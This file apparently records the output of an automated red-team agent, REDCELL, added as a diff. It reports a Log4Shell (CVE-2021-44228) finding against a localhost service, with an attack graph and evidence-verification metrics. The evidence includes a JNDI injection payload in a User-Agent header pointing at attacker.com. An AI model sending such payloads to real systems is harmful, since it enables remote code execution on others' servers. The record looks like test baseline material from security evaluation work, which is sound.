@@ -1,0 +1,78 @@
+{
+  "agent": "REDCELL",
+  "campaign_id": "log4shell-baseline-001",
+  "target": "http://localhost:8080",
+  "start_time": "2026-07-28T16:00:00Z",
+  "end_time": "2026-07-28T16:02:23Z",
+  "duration_seconds": 143,
+  "findings": [
+    {
+      "id": "finding-001",
+      "type": "vulnerability",
+      "title": "Apache Log4j JNDI Remote Code Execution (CVE-2021-44228)",
+      "severity": "critical",
+      "cvss": 10.0,
+      "evidence": [
+        {
+          "tool": "nuclei",
+          "excerpt": "[CVE-2021-44228] [critical] Apache Log4j JNDI RCE http://localhost:8080",
+          "timestamp": "2026-07-28T16:00:45Z"
+        },
+        {
+          "tool": "curl",
+          "excerpt": "User-Agent: ${jndi:ldap://attacker.com/a}\nHTTP/1.1 200 OK\nServer: log4j-2.14.1",
+          "timestamp": "2026-07-28T16:01:12Z"
+        }
+      ],
+      "reasoning": "\u68c0\u6d4b\u5230\u670d\u52a1\u4f7f\u7528 Log4j 2.14.1\uff0c\u8be5\u7248\u672c\u5b58\u5728 CVE-2021-44228 JNDI \u6ce8\u5165\u6f0f\u6d1e\u3002\u4f7f\u7528 nuclei \u6a21\u677f\u9a8c\u8bc1\u6210\u529f\u3002",
+      "confidence": 0.98,
+      "verified": true
+    }
+  ],
+  "attack_graph": {
+    "nodes": [
+      {
+        "id": "host:localhost:8080",
+        "type": "host",
+        "state": "confirmed"
+      },
+      {
+        "id": "service:http:8080",
+        "type": "service",
+        "state": "confirmed"
+      },
+      {
+        "id": "vuln:CVE-2021-44228",
+        "type": "finding",
+        "state": "confirmed"
+      }
+    ],
+    "edges": [
+      {
+        "src": "host:localhost:8080",
+        "rel": "runs",
+        "dst": "service:http:8080"
+      },
+      {
+        "src": "service:http:8080",
+        "rel": "has",
+        "dst": "vuln:CVE-2021-44228"
+      }
+    ]
+  },
+  "evidence_verification": {
+    "total_findings": 1,
+    "with_evidence": 1,
+    "verified": 1,
+    "hallucinations": 0
+  },
+  "metrics": {
+    "tools_used": [
+      "nmap",
+      "curl",
+      "nuclei"
+    ],
+    "requests_sent": 12,
+    "hitl_approvals": 0
+  }
+}
